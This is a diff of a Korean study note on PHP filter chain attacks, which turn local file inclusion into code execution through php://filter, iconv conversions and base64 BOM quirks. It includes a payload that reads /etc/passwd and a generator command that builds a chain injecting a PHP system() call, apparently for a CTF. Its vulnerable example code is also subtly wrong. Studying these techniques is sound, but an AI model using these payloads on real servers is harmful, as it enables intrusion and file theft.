@@ -1,49 +1,102 @@
 
 # PHP Filter Chain
 - PHP Wrapper
-
-
 - php://convert.iconv
 
 
-# 참고
-[체인 제네레이터](https://github.com/synacktiv/php_filter_chain_generator)
-[설명1](https://velog.io/@bintable/PHP-Filter-Chain)
-[설명2](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it)
-
-[CTF 예시]()
 
 # PHP Filter Gadget Chain
 - 인코딩과 디코딩을 반복하여 include()를 사용하는 서버에 LFI 공격 시 공격자의 코드가 추가되게 하는 공격방식
 - PHP 필터를 사용
 - LFI할 파일을 내맘대로 고를 수 있음
+- LFI 공격 자체에는 취약하지만, 확장자를 체크하는 경우 유용할 수 있음 
 
 
 # PHP Wrapper
+- LFI 공격에는 취약하지만 `php`확장자를 추가하여 파일을 못불러옴 
+- 버전이 올라가면서 null byte 공격도 안
+```php
+<?php
+
+	$file = $_GET['file_name'];
+	include('file_name'+'.php');
+
+?>
+```
+
+- 이 때 유용하게 사용할 수 있는게 PHP Wrapper임
+```php
+php://filter/convert.base64-encode/resource=/etc/passwd
+```
+
+- 이렇게 하면 php 파일이 랜더링 후 페이지가 가져와지는게 아니라 헤당 코드 자체를 인코딩 한 후 가져옴
 
 ---
 # php://convert.iconv
+- 인코딩 테이블
+```php
+$ iconv -l
+
+The following list contains all the coded character sets known.  This does
+not necessarily mean that all combinations of these names can be used for
+the FROM and TO command line parameters.  One coded character set can be
+listed with several different names (aliases).
+
+  437, 500, 500V1, 850, 851, 852, 855, 856, 857, 858, 860, 861, 862, 863, 864,
+  865, 866, 866NAV, 869, 874, 904, 1026, 1046, 1047, 8859_1, 8859_2, 8859_3,
+  8859_4, 8859_5, 8859_6, 8859_7, 8859_8, 8859_9, 10646-1:1993,
+  10646-1:1993/UCS4, ANSI_X3.4-1968, ANSI_X3.4-1986, ANSI_X3.4,
+  ANSI_X3.110-1983, ANSI_X3.110, ARABIC, ARABIC7, ARMSCII-8, ARMSCII8, ASCII,
+  ASMO-708, ASMO_449, BALTIC, BIG-5, BIG-FIVE, BIG5-HKSCS, BIG5, BIG5HKSCS,
+  BIGFIVE, BRF, BS_4730, CA, CN-BIG5, CN-GB, CN, CP-AR, CP-GR, CP-HU, CP037,
+  CP038, CP273, CP274, CP275, CP278, CP280, CP281, CP282, CP284, CP285, CP290,
+  CP297, CP367, CP420, CP423, CP424, CP437, CP500, CP737, CP770, CP771, CP772,
+  CP773, CP774, CP775, CP803, CP813, CP819, CP850, CP851, CP852, CP855, CP856,
+  CP857, CP858, CP860, CP861, CP862, CP863, CP864, CP865, CP866, CP866NAV,
+  CP868, CP869, CP870, CP871, CP874, CP875, CP880, CP891, CP901, CP902, CP903,
+  CP904, CP905, CP912, CP915, CP916, CP918, CP920, CP921, CP922, CP930, CP932
+```
+
+
+- php에서 iconv가 활성화되어 있는 경우 `php://convert.iconv.*.*` wrapper로 접근 가능
+```php
+convert.iconv.<input-encoding>.<output-encoding>
+convert.iconv.<input-encoding>/<output-encoding>
+```
+
+- file.txt 파일을 `UTF-8`에서 `ISO-8859-1` 인코딩 방식으로 변환하여 file 변수에 저장함
+```php
+$file = file_get_contents('php://convert.iconv.UTF-8/ISO-8859-1/resource=file.txt');
+```
 
 ---
 # base64decode
+- `ase64-decode 필터`는 `=`에 대해 올바른 패딩으로 인식하지 못 하고 잘못 처리하는 현상이 있음
+
 
 ---
 # Unicode BOM
+- 몇 인코딩에서는 인코딩 시 결과 값 앞에 바이트의 순서를 시스템에서 지정하기 위해 `BOM(Byte of Mark)`이라는 것을 추가함
 
----
-# Korean Character encoding for Internet Messages
+- `@_>`를 추가하여도 `base64-decode 필터`는 이를 `BOM`으로 인식하여 무시하고 디코딩한다는 것을 알 수 있음
+```php
+$ php -r "echo base64_decode('@_>YmFzZTY0');"
+base64
+```
 
----
-
-
+- 인코딩과 디코딩의 반복으로 기존 데이터 앞에 쓰레기 BOM이 붙게 되는데 이를 반복하여 원하는 데이터를 만드는게 목적
+- 위 과정을 자동화 한 툴이 [체인 제네레이터](https://github.com/synacktiv/php_filter_chain_generator)임
 
 # Generator 사용법
+```sh
+python3 php_filter_chain_generator.py --chain '<?php system("find /readflag -name readflag -exec cat {} \\; 2>&1"); ?> ' 
 
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...
+```
 
 
 # 다른 Code(sechack)
 ```python
-```py
 #!/usr/bin/env python3
 import argparse
 import base64
@@ -176,5 +229,13 @@ def main():
 if __name__ == "__main__":
     main()
 ```
-```
+
+
+
+# 참고
+[체인 제네레이터](https://github.com/synacktiv/php_filter_chain_generator)
+[설명1](https://velog.io/@bintable/PHP-Filter-Chain)
+[설명2](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it)
+
+[CTF 예시]()
 
